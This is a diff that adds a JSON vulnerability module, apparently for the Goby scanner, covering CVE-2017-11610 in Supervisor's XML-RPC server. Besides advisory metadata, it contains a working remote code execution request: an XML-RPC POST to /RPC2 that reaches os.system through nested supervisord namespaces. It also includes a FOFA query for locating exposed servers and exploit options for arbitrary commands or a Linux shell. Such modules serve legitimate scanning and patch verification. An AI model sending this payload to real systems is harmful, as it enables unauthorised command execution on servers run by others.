@@ -1,0 +1,92 @@
+{
+  "Name": "Supervisor XML-RPC Authenticated Remote Code Execution",
+  "Description": "The XML-RPC server in supervisor before 3.0.1, 3.1.x before 3.1.4, 3.2.x before 3.2.4, and 3.3.x before 3.3.3 allows remote authenticated users to execute arbitrary commands via a crafted XML-RPC request, related to nested supervisord namespace lookups.",
+  "Product": "Supervisor",
+  "Homepage": "https://github.com/Supervisor/supervisor",
+  "DisclosureDate": "2017-08-23",
+  "Author": "gobysec@gmail.com",
+  "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/Supervisor/CVE-2017-11610/CVE-2017-11610.gif",
+  "FofaQuery": "app=\"supervisord\" || title=\"Supervisor Status\"",
+  "Level": "3",
+  "Impact": "It will run arbitrary shell commands on the server.",
+  "Recommendation": "Upgrade from https://github.com/Supervisor/supervisor",
+  "References": [
+    "http://www.debian.org/security/2017/dsa-3942",
+    "https://access.redhat.com/errata/RHSA-2017:3005",
+    "https://github.com/Supervisor/supervisor/blob/3.0.1/CHANGES.txt",
+    "https://github.com/Supervisor/supervisor/blob/3.1.4/CHANGES.txt",
+    "https://github.com/Supervisor/supervisor/blob/3.2.4/CHANGES.txt",
+    "https://github.com/Supervisor/supervisor/blob/3.3.3/CHANGES.txt",
+    "https://github.com/Supervisor/supervisor/issues/964",
+    "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4GMSCGMM477N64Z3BM34RWYBGSLK466B/",
+    "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DTPDZV4ZRICDYAYZVUHSYZAYDLRMG2IM/",
+    "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JXGWOJNSWWK2TTWQJZJUP66FLFIWDMBQ/",
+    "https://security.gentoo.org/glsa/201709-06",
+    "https://www.exploit-db.com/exploits/42779/",
+    "https://nvd.nist.gov/vuln/detail/CVE-2017-11610",
+    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11610"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+	{
+	  "name": "AttackType",
+	  "type": "select",
+	  "value": "cmd,goby_shell_linux"
+	},
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami",
+      "show": "AttackType=cmd"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "<?xml version=\"1.0\"?><methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName><params><param><string>aaaaa</string></param></params></methodCall>",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "POST",
+        "uri": "/RPC2"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "methodResponse",
+            "variable": "$body"
+          },
+		  {
+            "bz": "",
+            "operation": "regex",
+            "type": "item",
+            "value": "<int>(.*?)</int>",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": null,
+  "CVEIDs": [
+    "CVE-2017-11610"
+  ],
+  "CVSSScore": "8.8",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
